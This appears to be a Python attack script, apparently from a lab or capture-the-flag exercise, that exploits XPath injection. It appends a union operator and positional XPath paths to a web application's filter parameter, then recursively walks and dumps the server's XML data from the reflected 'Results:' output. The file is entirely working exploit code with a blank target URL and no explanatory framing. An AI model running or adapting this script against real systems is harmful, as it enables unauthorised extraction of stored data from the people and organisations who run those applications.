import requests  # For making HTTP requests to the server
from lxml import html  # For parsing HTML responses
import re  # For regular expression operations

# URL to send requests to
url = ""

# List to store extracted XML data
xml_document = []

def extract(payload):
    """
    Sends a GET request with a specific payload and extracts results if present.
    """
    params = {
        'q': 'x',  # Query parameter 'q'
        'f': "streetname | " + payload  # Filter parameter 'f'
    }
    # Send the GET request
    resp = requests.get(url=url, params=params)

    # Check if the response contains the string "Results:"
    if "Results:" in resp.text:
        # Parse the HTML response
        tree = html.fromstring(resp.text)
        # Extract content under the "Results:" center tag
        result = tree.xpath("//center[b/text()='Results:']")[0].text_content()
        # Clean up the "Results:" prefix
        result = re.sub("Results:", "", result)
        
        # If the cleaned result contains data, append to the document list
        if result.strip():
            xml_document.append(result)
            return True  # Indicate successful extraction

        return False  # No valid data extracted

def get_depth(payload, max_depth, depth):
    """
    Recursively explores data at increasing depths until the maximum depth is reached.
    """
    # Check if this depth returned valid data
    if extract(''.join(payload)):
        print("Found data at depth:", depth)
        print("Payload:", payload)
        # Loop over this depth to extract all values
        loop_over_depth(payload, depth, 10)
        return
    # If no valid data and depth limit not yet reached
    elif depth < max_depth:
        # Recurse by appending a deeper path to the payload
        payload.append("/*[1]")
        # Continue exploration at the next depth level
        get_depth(payload, max_depth, depth + 1)
        return
    else:
        # Maximum depth reached with no results
        return

def loop_over_depth(payload, position, loop_depth):
    """
    Iterates through elements at the current depth to extract all possible values.
    """
    for i in range(1, loop_depth):
        # Update the current position in the payload with a new index
        payload[position] = f"/*[{i}]"
        print(payload)
        # Attempt extraction for the updated payload
        if not extract(''.join(payload)):
            print("No more data to extract at index", i)
            return

# Maximum depth to explore
max_depth = 10

# Start exploration at different initial payloads
for i in range(1, 10):
    # Initialize the payload with a starting structure
    payload = ["/*[1]", "/*[2]", "/*[1]"]
    # Update the last element to a specific index
    payload[2] = f"/*[{i}]"
    print("Payload: ", payload)
    # Begin depth exploration
    get_depth(payload, max_depth, len(payload) - 1)

# Print the extracted XML data
print(xml_document)